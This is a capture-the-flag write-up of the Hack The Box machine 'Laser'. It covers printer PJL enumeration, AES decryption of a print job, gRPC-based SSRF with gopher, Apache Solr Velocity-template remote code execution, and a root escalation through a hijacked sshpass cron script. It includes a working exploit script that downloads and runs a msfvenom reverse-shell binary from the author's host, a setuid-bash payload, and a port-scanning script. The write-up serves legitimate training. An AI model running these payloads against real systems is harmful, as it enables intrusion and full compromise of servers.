---
"title": "Hack The Box - Laser"
"date": 2020-12-19
"tags": ["linux", "insane", "printer", "ssrf", "pjl", "grpcurl", "solr", "sshpass"]
"keywords": ["linux", "insane", "printer", "ssrf", "pjl", "grpcurl", "solr", "sshpass"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Doing the initial scan we realize that only 3 ports are open, one being the ssh and the other two being the clistener and printer service port. This was unexpected since for most of the machines we expect a webserver or anything similar to that so that we could progress on initial step but this was `Insane` rated machine on HackTheBox, without further ado let's start."
"featured_image": "/img/htb-laser/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-laser/Untitled.png)

Doing the initial scan we realize that only 3 ports are open, one being the ssh and the other two being the clistener and printer service port. This was unexpected since for most of the machines we expect a webserver or anything similar to that so that we could progress on initial step but this was `Insane` rated machine on HackTheBox, without further ado let's start.

Link: [https://www.hackthebox.eu/home/machines/profile/269](https://www.hackthebox.eu/home/machines/profile/269)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
9000/tcp open  cslistener?
9100/tcp open  jetdirect?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.80%I=7%D=8/9%Time=5F2F6D9F%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\
SF:xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0")%r(GenericLines,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0
SF:\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(GetRequest,3F,"\0\
SF:0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0
SF:\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0")%r(HTTPOptions,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0
SF:@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01
SF:\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(RTSPRequest,3F,"\0\0\x18\x04
SF:\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\
SF:0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")
SF:%r(RPCCheck,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\
SF:0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(DNSVersionBindReqTCP,3F,"\0\0\x18\x04\0\
SF:0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0
SF:\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(
SF:DNSStatusRequestTCP,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\
SF:0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0
SF:\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(Help,3F,"\0\0\x18\x04\0\0\0\0\0\
SF:0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(SSLSessi
SF:onReq,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x2
SF:0\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0")%r(TerminalServerCookie,3F,"\0\0\x18\x04\0\0\0\0\
SF:0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x
SF:08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(TLSSes
SF:sionReq,3F,"\0\0\x18\x04\0\0\0\0\0\0\x04\0@\0\0\0\x05\0@\0\0\0\x06\0\0\
SF:x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\x01\0\0\x08\x06\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   256.90 ms 10.10.14.1
2   257.04 ms 10.10.10.201
```

## LaserJet Enumeration

With initial scan we found out that there's a printer service running on port `9100`, So I googled on how to enumerate it and Got this Cheatsheet.

> [https://book.hacktricks.xyz/pentesting/9100-pjl](https://book.hacktricks.xyz/pentesting/9100-pjl)

By following the cheatsheet, I found its a **LaserCorp LaserJet 4ML.**

```bash
┌──(root🐺kali)-[~/htb/boxes/laser/PRET]
└─# telnet 10.10.10.201 9100
Trying 10.10.10.201...
Connected to 10.10.10.201.
Escape character is '^]'.
@PJL INFO STATUS
CODE=10001
DISPLAY="LaserCorp supply in use"
ONLINE=TRUE
@PJL INFO ID
LaserCorp LaserJet 4ML
```

### What is PJL?

**Printer Job Language is a method developed by Hewlett-Packard for switching printer languages at the job level, and for status readback between the printer and the host computer.**

Trying to search on how to connect or even interact with the Laser, I stumbled upon the PRET tool on github, which is a tool used in printer security testing. 

> [https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)

![Untitled](/img/htb-laser/Untitled%201.png)

Using the tool we can see there's not much of stuffs to look out rather than a file with base64 encoded data, I tried to decode the data and save it to a file but it failed as we get more gibberish data.

```bash
10.10.10.201:/> find
/pjl/
/pjl/jobs/
/pjl/jobs/queued
10.10.10.201:/> cat /pjl/jobs/queued
b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAHnfef9tCBj4u+wj/uGE1BLmL3Mtp/YL+wiVXD5MKKmdevvEhIONVNBQv26yTwdZFPYrcPTC9BXqk/vwzfR3BWoDRajzyLWcah8TOugtXl0ndmVwYajU0LvStgspvXIGsjl8VWFRi/kQJr+YsAb2lQu+Kt2LCuyooPLKN3EO/puvAOSdICSoi7RKfzg937j7Evcc0x5a3YAIes/j5rGroQuOrWwPlmbC5cvnpqkgBmZCuHCGMqBGRtDOt3vLQ/tI9+u99/0Ss6sIpOladA5aFQdw3cqRFAc+OErVPnexIJ70St31H8tdYqsAvHvfbX
.
.
.
```

After fiddling around PRET options I found out that there's a command name `nvramdump` which dumps the content of the memory of the printer which gave us a `k.e.y.` which was of 16 bytes which made me sure that the file must be encrypted with the AES.

```bash
10.10.10.201:/> nvram dump
Writing copy to nvram/10.10.10.201
..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................k...e....y.....13vu94r6..643rv19u
```

Now here's a catch I thought it was AES-ECB as we didn't get any IV but it failed, so that leave us the option of the AES-CBC as we have the key and the data.

While checking the environmental variable its confirmed the encryption is AES-CBC.

```bash
10.10.10.201:/> env
COPIES=1 [2 RANGE]
	1
	999
.
.
.
.
.
LPARM:PCL SYMSET=ROMAN8 [4 ENUMERATED]
	ROMAN8
	ISOL1
	ISOL2
	WIN30
LPARM:POSTSCRIPT PRTPSERRS=OFF [2 ENUMERATED]
	OFF
	ON
LPARM:ENCRYPTION MODE=AES [CBC]
```

We have the key and the data, the IV could be the ciphertext's first 16 bytes which we can consider for the IV for decrypting the data, using the following python script and using the `Crypto` module of the python:-

```python
import base64
from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[:-ord(s[len(s)-1:])]
queue = b'ENCRYPTED DATA'

class AESCipher:
    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        enc = enc[8:]
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

key= b'13vu94r6643rv19u'

f = open("output", "wb")
f.write(AESCipher(key).decrypt(queue))
f.close()
```

Reference :-

- [https://stackoverflow.com/questions/9049789/aes-encryption-key-versus-iv](https://stackoverflow.com/questions/9049789/aes-encryption-key-versus-iv)
- [https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)

After decrypting, we found out that the resulting data is a PDF.

![Untitled](/img/htb-laser/Untitled%202.png)

## The `grpc` service and port 9000

Let's see what the PDF has to say:-

![Untitled](/img/htb-laser/Untitled%203.png)

So, according to the PDF there's a `grpc` service running on the port 9000 and it is used to push feeds to the server and when there's a successful data transmission has been made we will get `Pushing Feeds` as the response from the server. After going through number of articles written in English to written to Korean, I understood the workaround the `grpc`, to summaries, we need a `.proto` extension file and on the basis of the service defined in the `proto` file, the `grpc` will establish a channel to the server and interact with the service via the constraints defined within the proto file i.e. which kind of data has to be transmitted and what kind of response etc.

Thanks to the PDF, we understood the client-side workflow and what kind of `proto` file we need for interacting with service. We made the following the `service.proto`. So I created one according to the PDF mentioned.

```prolog
syntax = "proto3";

service Print{
	rpc Feed(Content) returns(Data) {}
}

message Content{
	string data = 1;
}

message Data{
	string feed = 1;
}
```

Reference :-

- [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)
- [https://developers.google.com/protocol-buffers/docs/proto3](https://developers.google.com/protocol-buffers/docs/proto3)

As I as familiar with the python, I chose the python for interacting with the `grpc` service. We can also use GO or C++ there is a lot.

Then we generate the python files we needed to interact with the server using `command`:-

```bash
┌──(root🐺kali)-[~/htb/boxes/laser/grpc]
└─# python3 -m grpc_tools.protoc -I=. --python_out=. --grpc_python_out=. ./service.proto
┌──(root🐺kali)-[~/htb/boxes/laser/grpc]
└─# ls
service_pb2_grpc.py  service_pb2.py  service.proto
```

Now, In order to connect the server we also needed to know the format it accepts the feed as, which again thanks to the PDF as it was mentioned we have to give a json like data. Then, we can connect to the service with the help of the python files generated via python's `grpcio` library. Here's a sample python grpc client to send feeds to the server.

```python
import service_pb2
import service_pb2_grpc
import grpc
import pickle
import base64
import json

json_data={
"feed_url" : "http://printer.laserinternal.htb/feeds.json"
}
#print(json_data)
send_data = json.dumps(json_data)
Serialized_Data = pickle.dumps(send_data) 
b64_encoded = base64.b64encode(Serialized_Data)
#print (b64_encoded)

def run():
    channel = grpc.insecure_channel('10.10.10.201:9000')
    stub = service_pb2_grpc.PrintStub(channel)

    get_data = service_pb2.Content()
    get_data.data = b64_encoded

    response = stub.Feed(get_data)
    #print(response.SerializeToString())
    print(response)

if __name__ == '__main__':
    run()
```

Running the script first we get failed error as the subdomain mentioned in PDF wasn't resolved, so I tried for good old `localhost` and Connection refused so the inner port 80 is not open.

![Untitled](/img/htb-laser/Untitled%204.png)

### Apache Solr internal service

Since we can connect to the localhost via `grpc` and we can define URL with any port in it, we do a small bruteforce, if it was an error we will ignore the port and if it returns Pushing Feeds, we can considered that as open port.

Instead of Trying each and every port. I decided to check common ports.

> [https://github.com/krish512/Common-Ports/blob/master/ports.list](https://github.com/krish512/Common-Ports/blob/master/ports.list)

```python
import service_pb2
import service_pb2_grpc
import grpc
import pickle
import base64
import json

all_ports=['15','17','18','18','19','19','21','22','23','25','80','81','123','389','443','636','989','990','1433','1499','2022','2122','2222','2375','2376','2380','2480','2483','2484','2638','3000','3001','3020','3306','3389','3389','3500','3999','4000','4100','4200','4243','4244','4444','4500','4505','4506','5000','5001','5004','5005','5037','5432','5500','5601','5666','5667','5672','5800','5900','5984','5999','6000','6082','6379','6653','6660','6661','6662','6663','6664','6665','6666','6667','6668','6669','6888','6888','7474','7777','8000','8001','8002','8005','8008','8080','8089','8081','8123','8139','8140','8172','8222','8333','8443','8889','8983','8999','9000','9001','9006','9042','9050','9051','9092','9200','9500','9800','9999','10050','10051','11211','11214','11215','15672','18091','18092','27017','27018','27019','28015','29015','33848','35357']
for ports in all_ports:
    json_data={
        "feed_url" : "http://localhost:{}".format(ports)
        }
    send_data = json.dumps(json_data)
    Serialized_Data = pickle.dumps(send_data) 
    b64_encoded = base64.b64encode(Serialized_Data)
    #print (b64_encoded)
    channel = grpc.insecure_channel('10.10.10.201:9000')
    stub = service_pb2_grpc.PrintStub(channel)

    get_data = service_pb2.Content()
    get_data.data = b64_encoded
    try:
        response = stub.Feed(get_data)
        #print(response.SerializeToString())
        print ("Port {}".format(ports))
        print (response)
    except Exception as E:
        pass
```

The result of that script was port `8983` which was default port for Apache Solr service, what can we do with this? I searched for an exploit on the Exploit-Database, 

![Untitled](/img/htb-laser/Untitled%205.png)

Then I stumbled upon the [this exploit](https://www.exploit-db.com/exploits/47572) and which can be used to get the RCE on the machine **but** after analyzing the exploit I realized it was sending a `POST` request, ah here we go again, how are we supposed to send a `POST` request if we can barely interact with the Apache Solr. To my surprise, the `gopher` protocol was accepted by the server.

Reference :-

- [https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher)

Now its time for use to find, How to exploit it. So I just breakdown the exploit.

```python
## Step1

Get -> http://localhost:8983/solr/admin/cores?_=timestamp&indexInfo=false&wt=json

            => status 

-------------------------------------------------------------------------------------------

## Step2

Post -> http://localhost:8983/solr/status/config

{
    'update-queryresponsewriter': {
    'startup': 'lazy',
    'name': 'velocity',
    'class': 'solr.VelocityResponseWriter',
    'template.base.dir': '',
    'solr.resource.loader.enabled': 'true',
    'params.resource.loader.enabled': 'true'
                }
}

-------------------------------------------------------------------------------------------

## Step3

Get -> http://localhost:8983/solr/status/select?q=1

Payload:-

&&wt=velocity&v.template=custom&v.template.custom=#set($x='')+#set($rt=$x.class.forName('java.lang.Runtime'))+#set($chr=$x.class.forName('java.lang.Character'))+#set($str=$x.class.forName('java.lang.String'))+#set($ex=$rt.getRuntime().exec('id'))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
-------------------------------------------------------------------------------------------
```

Reference :- 

- [https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template](https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template)
- [https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt](https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt)

So from the exploit if you see the first step we need to find something called core from status, If we recall, its already in the PDF and its called `staging`

![Untitled](/img/htb-laser/Untitled%206.png)

Now we have everything to proceed, first I decided to test it with Python but it will give some problem because of URL encoding. And I found this cool tool called gRPCurl

> [https://github.com/fullstorydev/grpcurl](https://github.com/fullstorydev/grpcurl)

I just tested how it works. And it seems we need to provide the same `.proto` file.

```bash
┌──(root🐺kali)-[~/htb/boxes/laser]
└─# grpcurl --plaintext 10.10.10.201:9000 list                                                                                                                                        
Failed to list services: server does not support the reflection API
```

> As mentioned above, grpcurl works seamlessly if the server supports the reflection service. If not, you can supply the .proto source files or you can supply protoset files (containing compiled descriptors, produced by protoc) to grpcurl.

Now its working good.

```bash
┌──(root🐺kali)-[~/htb/boxes/laser]
└─# grpcurl -import-path grpc_printer -plaintext -proto service.proto 10.10.10.201:9000 list                                                                                         
Print
┌──(root🐺kali)-[~/htb/boxes/laser]
└─# grpcurl -import-path grpc_printer -plaintext -proto service.proto 10.10.10.201:9000 list Print 
Print.Feed
```

And if you recall correct, from the PDF it mentioned the feeds must be submitted in serialized format and is also saying the same.

```bash
┌──(root🐺kali)-[~/htb/boxes/laser]
└─# grpcurl -import-path grpc_printer -plaintext -proto service.proto 10.10.10.201:9000 Print/Feed                                                                                   
ERROR:
  Code: Internal
  Message: Failed to serialize response!
```

I did some deserialization attempts after some tries, I got this. So we need to serialized the format and base64 encode it too.

```bash
ERROR:
  Code: Unknown
  Message: Exception calling application: Invalid base64-encoded string: number of data characters (5) cannot be 1 more than a multiple of 4 
```

So I just serialized this and base64 encoded it.

```json
{
"feed_url" : "http://localhost:8983"
}
```

And passed the output here and it worked. 

```bash
┌──(root🐺kali)-[~/htb/boxes/laser]
└─# grpcurl -plaintext -proto grpc_printer/service.proto -d '{"data": "Uyd7ImZlZWRfdXJsIjogImh0dHA6Ly9sb2NhbGhvc3Q6ODk4MyJ9JwpwMAou"}' 10.10.10.201:9000 Print.Feed                    
{
  "feed": "Pushing feeds"
}
```

## Getting User Shell

Now its time to get shell, we already know how to send GET and POST request using gopher. First we need to send a POST request to change the `Resource Loader Enabled` and we can get RCE.

```python
import pickle 
import base64
import os
import urllib

CORE = "staging"
#HOST = "10.10.14.30" # me
HOST = "localhost:8983"  # target
gopher = "gopher://"+HOST+"/"

print("[+] LASER RCE Automation Script")
print("[+] Script Started")
url =   "0POST /solr/"+CORE+"/config HTTP/1.1\r\n" \
        "Host: http://"+HOST+"\r\n" \
        "User-Agent: FeedBot v1.0\r\n" \
        "Content-Type: application/json;charset=utf-8\r\n" \
        "Connection: Close\r\n" \
        "Accept: */*\r\n" \
        "Content-Length: 206\r\n" \
        "\r\n" \
        "{\"update-queryresponsewriter\":{\"startup\":\"lazy\",\"name\":\"velocity\",\"class\":\"solr.VelocityResponseWriter\",\"template.base.dir\":\"\",\"solr.resource.loader.enabled\":\"true\",\"params.resource.loader.enabled\":\"true\"}}"
            
            
data = '{"feed_url": "'+gopher+urllib.quote(url)+'"}'
#print(data)
pickled = pickle.dumps(data)
print("[+] Sending POST to update config...")	
payload = base64.b64encode(pickled)
cmd = 'grpcurl -plaintext -allow-unknown-fields -import-path /root/htb/boxes/laser/grpc_printer/ -proto /root/htb/boxes/laser/grpc_printer/service.proto -d \'{"data":"'+payload.decode('utf-8')+'}"}\' 10.10.10.201:9000 Print.Feed 1>/dev/null'
os.system(cmd)
print("[+] Resource Loader Enabled")

#msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=1234 -f elf > shell.elf
wget = "exec('wget -O /tmp/shell.elf http://10.10.14.30/shell.elf')"
chmod = "exec('chmod +x /tmp/shell.elf')"
execute = "exec('/tmp/shell.elf')"
commands = [wget, chmod, execute]
for c in commands:
    command = urllib.quote(c)
    pickled = pickle.dumps('{"feed_url": "http://'+HOST+'/solr/'+CORE+'/select?qq=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().'+ command +')+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end"}')
    #print(pickled)
    payload = base64.b64encode(pickled)
    cmd = 'grpcurl -plaintext -allow-unknown-fields -import-path /root/htb/boxes/laser/grpc_printer/ -proto /root/htb/boxes/laser/grpc_printer/service.proto -d \'{"data":"'+payload.decode('utf-8')+'}"}\' 10.10.10.201:9000 Print.Feed 1>/dev/null'
    os.system(cmd)
    print("[+] Time for Shell...")
```

Now, this was the time to spawn a reverse shell, I tried using the `nc` payload or almost 80% od the pentestmonkey's reverse shell payload but none worked, that's when I created a ELF file with my `LHOST` and `LPORT` and generated it via `msfvenom`. Then I started local HTTP Server and managed to transfer it to the machine. And then running a series of command for marking the file as executable and then executing it, resulted in a reverse shell. So much for a reverse shell.

![Untitled](/img/htb-laser/Untitled%207.png)

## Privilege Escalation

Now, we have a reverse shell, we can go to the home directory of the `solr` but there's wasn't any `user` flag? But then I started looking for anything, upon researching I found that the real home directory as `solr` was in `/var/solr` and we got the flag. Then I added my public key to the `.ssh/authorized_keys` as the file wasn't normally there I created it.

Nothing interesting could be found by running LinEnum except the fact that we have a docker running. But no way could be found to get into the docker. So, it was time to run `pspy` to get the list of background process.

![Untitled](/img/htb-laser/Untitled%208.png)

```bash
c413d115b3d87664499624e7826d8c5a
```

I found a strange process running in the background which was `sshpass -p {password} ssh root@docker_ip /tmp/clear.sh` which seems to be executing the script in docker non-interactively via `sshpass`. Since `sshpass` takes the password from the command line, we get the password for `root` login for docker. 

### Docker

I picked the password and logged into the docker but there was.....nothing? It was just a simple docker which had `feeds` folder in docker but except that nothing at all.

![Untitled](/img/htb-laser/Untitled%209.png)

Honestly, this was not that hard considering the initial foothold, but nonetheless it was great. From pspy background process analysis, we knew that `sshpass` is being used to copy the files from solr's machine `/root/` folder to copy files from solr's machine to docker, there was a script which was being copied to the `/tmp/` folder of the docker. Since the `scp` was used to copy the `clear.sh` to the docker and then it is being executed via `sshpass`.

```bash
2020/08/23 09:44:01 CMD: UID=0    PID=407088 | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@172.18.0.2 /tmp/clear.sh
2020/08/23 09:44:01 CMD: UID=0    PID=407106 | sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz ssh root@172.18.0.2 rm /tmp/clear.sh
```

So I thought of what if we could port forward the ssh service to the solr machine? Doing that so, the `clear.sh` will run from the `solr`'s `/tmp` folder. But what next? If the `scp` is used to copy the `/tmp/clear.sh` of the docker and we port forwarded it to the `solr`'s machine that means all the cronjobs involving the `sshpass` and docker. So, first the `clear.sh` is copied to the `/tmp` folder then it is being executed and then it is being deleted. Since the cron wasn't recursive and `scp` was being used for copying the file, we can create a file in the `solr` and it'll be executed by the root of our system. 

```prolog
root@20e3289bc183:/tmp# service ssh stop
 * Stopping OpenBSD Secure Shell server sshd                                                        [ OK ] 
root@20e3289bc183:/tmp# 
root@20e3289bc183:/tmp# ./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.18.0.1:22
```

I used socat to do the Port Forward and Stopped the SSH service.

I just make a simple `clear.sh` and placed it in solr's `/tmp`  

```prolog
#!/bin/sh

cp /bin/bash /tmp/root; chmod 4775 /tmp/root
```

After few minutes the file is created.

```prolog
solr@laser:/tmp$ ls -la root 
-rwsrwxr-x 1 root root 1183448 Aug 23 10:03 root
solr@laser:/tmp$ ./root -p
root-5.0# whoami;hostname
root
laser
```

We own the box.